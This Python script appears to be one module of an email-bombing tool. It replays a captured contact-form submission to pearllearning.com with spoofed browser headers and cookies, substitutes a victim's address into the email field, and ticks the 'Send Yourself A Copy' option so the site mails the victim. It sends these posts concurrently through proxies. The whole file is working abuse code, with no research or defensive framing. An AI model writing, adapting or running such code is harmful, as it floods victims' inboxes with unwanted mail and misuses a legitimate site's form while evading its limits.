from os.path import basename

import requests

from module import Spam

cookies = {
    '_gid': 'GA1.2.484322152.1677069010',
    '_ga_8DWCNGFGDK': 'GS1.1.1677069008.1.1.1677069059.0.0.0',
    '_ga': 'GA1.2.1844347220.1677069009',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryPwqrMnNX1UN4UqsR',
    # Requests sorts cookies= alphabetically
    # 'Cookie': '_gid=GA1.2.484322152.1677069010; _ga_8DWCNGFGDK=GS1.1.1677069008.1.1.1677069059.0.0.0; _ga=GA1.2.1844347220.1677069009',
    'Origin': 'https://pearllearning.com',
    'Referer': 'https://pearllearning.com/contact/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryPwqrMnNX1UN4UqsR\r\nContent-Disposition: form-data; name="input_6"\r\n\r\ntest\r\n------WebKitFormBoundaryPwqrMnNX1UN4UqsR\r\nContent-Disposition: form-data; name="input_7"\r\n\r\ntest\r\n------WebKitFormBoundaryPwqrMnNX1UN4UqsR\r\nContent-Disposition: form-data; name="input_1.3"\r\n\r\ntest\r\n------WebKitFormBoundaryPwqrMnNX1UN4UqsR\r\nContent-Disposition: form-data; name="input_1.6"\r\n\r\n----\r\n------WebKitFormBoundaryPwqrMnNX1UN4UqsR\r\nContent-Disposition: form-data; name="input_2"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryPwqrMnNX1UN4UqsR\r\nContent-Disposition: form-data; name="input_10"\r\n\r\n(123) 312-2132\r\n------WebKitFormBoundaryPwqrMnNX1UN4UqsR\r\nContent-Disposition: form-data; name="input_4"\r\n\r\ntest\r\n------WebKitFormBoundaryPwqrMnNX1UN4UqsR\r\nContent-Disposition: form-data; name="input_5.1"\r\n\r\nSend Yourself A Copy\r\n------WebKitFormBoundaryPwqrMnNX1UN4UqsR\r\nContent-Disposition: form-data; name="is_submit_2"\r\n\r\n1\r\n------WebKitFormBoundaryPwqrMnNX1UN4UqsR\r\nContent-Disposition: form-data; name="gform_submit"\r\n\r\n2\r\n------WebKitFormBoundaryPwqrMnNX1UN4UqsR\r\nContent-Disposition: form-data; name="gform_unique_id"\r\n\r\n\r\n------WebKitFormBoundaryPwqrMnNX1UN4UqsR\r\nContent-Disposition: form-data; name="state_2"\r\n\r\nWyJbXSIsImE5OGFmMGRhYmZlMjM0NTVhOGUxYjQ5OTcyZGM0YTYxIl0=\r\n------WebKitFormBoundaryPwqrMnNX1UN4UqsR\r\nContent-Disposition: form-data; name="gform_target_page_number_2"\r\n\r\n0\r\n------WebKitFormBoundaryPwqrMnNX1UN4UqsR\r\nContent-Disposition: form-data; name="gform_source_page_number_2"\r\n\r\n1\r\n------WebKitFormBoundaryPwqrMnNX1UN4UqsR\r\nContent-Disposition: form-data; name="gform_field_values"\r\n\r\n\r\n------WebKitFormBoundaryPwqrMnNX1UN4UqsR\r\nContent-Disposition: form-data; name="version_hash"\r\n\r\nd591ba81dcbf042d7c36959da7ddf714\r\n------WebKitFormBoundaryPwqrMnNX1UN4UqsR--\r\n'
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text())
        response = requests.post('https://pearllearning.com/contact/', cookies=cookies, headers=headers,
                                 data=data.encode(), proxies=self.get_proxies())
        return response


def main():
    s = 'Thanks for contacting us!'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
